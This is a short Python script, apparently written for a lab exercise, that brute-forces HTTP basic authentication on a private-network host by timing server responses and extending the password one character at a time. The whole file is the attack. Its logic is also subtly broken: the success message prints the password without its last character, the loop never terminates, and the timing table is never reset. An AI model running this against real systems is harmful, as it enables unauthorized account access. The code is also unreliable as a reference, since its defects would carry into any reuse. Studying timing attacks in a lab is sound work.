#!/usr/bin/env python3
import time
import string
import requests

# Script used to bruteforce http basic auth based on how much time it takes to
# compare two strings.

url = 'http://192.168.22.129/authentication/example2/'

times = {}

password = ''
while True:
    for char in string.ascii_lowercase + string.digits:
        temp_password = password + char
        start = time.time()
        r = requests.get(url, auth=('hacker', temp_password))
        if r.status_code == 200:
            print(f'Found password {password}')
            break
        duration = time.time() - start
        times[duration] = char
        print(temp_password, duration)
    password += times[max(times.keys())]
